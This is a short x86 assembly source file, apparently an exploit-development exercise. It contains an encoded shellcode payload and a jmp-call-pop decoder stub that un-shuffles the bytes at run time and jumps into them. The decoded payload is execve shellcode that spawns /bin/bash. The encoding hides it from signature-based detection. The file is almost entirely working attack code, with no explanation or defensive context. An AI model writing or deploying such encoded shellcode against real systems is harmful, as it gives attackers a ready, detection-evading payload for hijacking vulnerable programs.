global _start

section .text
    
_start:
    xor     eax, eax
    xor     ebx, ebx
    xor     ecx, ecx
    xor     edx, edx
    jmp short call_decoder
    
decoder:
    pop     esi
    mov     eax, esi
    mov     cl, 12          ; ecx = 12
    
decode:
    ; swap bytes [C A B] → [A B C]
    ; esi = starting shellcode addr
    ; eax = current byte pointer, incremented by 3 each time
    mov     bl, byte [eax]              ; bl = C
    xchg    byte [eax + 2], bl          ; [ C A C ] , bl = B
    xchg    byte [eax + 1], bl          ; [ C B C ] , bl = A
    xchg    byte [eax], bl              ; [ A B C ]
    add     al, 0x3                     
    loop    decode
    jmp     esi
    
call_decoder:
    call     decoder
    Shellcode: db 0x50,0x31,0xc0,0x61,0x68,0x62,0x68,0x73,0x68,0x6e,0x62,0x69,0x2f,0x2f,0x68,0x2f,0x2f,0x2f,0x50,0x89,0xe3,0x53,0x89,0xe2,0x31,0x89,0xe1,0xc0,0xc0,0x83,0x80,0x0b,0xcd,0x90,0x31,0xc0

